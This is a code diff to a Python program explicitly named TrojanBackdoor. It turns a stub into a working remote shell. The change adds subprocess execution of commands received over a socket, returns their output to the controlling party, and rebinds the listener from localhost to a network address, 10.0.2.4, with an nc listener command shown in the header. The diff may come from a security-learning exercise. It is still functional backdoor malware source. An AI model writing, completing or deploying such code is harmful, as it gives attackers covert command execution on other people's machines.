@@ -2,6 +2,7 @@
 nc -vv -l -p 8080  #Listen to the 8080 port locally
 """
 import socket, os, time, threading, sys
+from subprocess import Popen, PIPE
 
 class TrojanBackdoor(threading.Thread):
     def __init__(self, conf_dict):
@@ -37,7 +38,7 @@ class TrojanBackdoor(threading.Thread):
     def socket_accept(self):
         try:
             self.conn, address = self.sock.accept()
-            self.conn.setblocking(False)  # no timeout
+            self.conn.setblocking(1)  # no timeout set to False
             print("Accepting connection from ", address)
         except Exception as e:
             print("Accepted connection error: ", e)
@@ -61,17 +62,25 @@ class TrojanBackdoor(threading.Thread):
             # print("waiting for incoming message")
             self.receive_message()
             if self.master_message != "":
-                command = self.master_message[:3]
-                if command == "--c":
+                command = self.master_message
+                if command[:3] == "--c":
                     self.execute_shell_command()
-                elif command == "--s":
+                elif command[:3] == "--s":
                     self.execute_screenshot()
+                elif command[:4] == "exit":
+                    self.close()
+                    break
                 else:
                     self.send_message("Unknown command, please try again")
 
     def execute_shell_command(self):
-        pass
-        self.send_message("Shell command Executed")
+        command = self.master_message[3:]
+        p = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
+        std_out, std_err =  p.communicate()
+        if std_out != b"":
+            self.send_message(std_out.decode())
+        else:
+            self.send_message(std_err.decode())
 
     def execute_screenshot(self):
         pass
@@ -82,14 +91,13 @@ class TrojanBackdoor(threading.Thread):
         self.socket_bind()
         self.socket_accept()
         self.backdoor_logic()
-        self.close()
 
     def close(self):
         self.sock.close()
 
 
 def main():
-    conf_dict = {'host': '127.0.0.1', 'port': 8080}
+    conf_dict = {'host': '10.0.2.4', 'port': 8080}
     trojan_instance = TrojanBackdoor(conf_dict)
     trojan_instance.run()
 
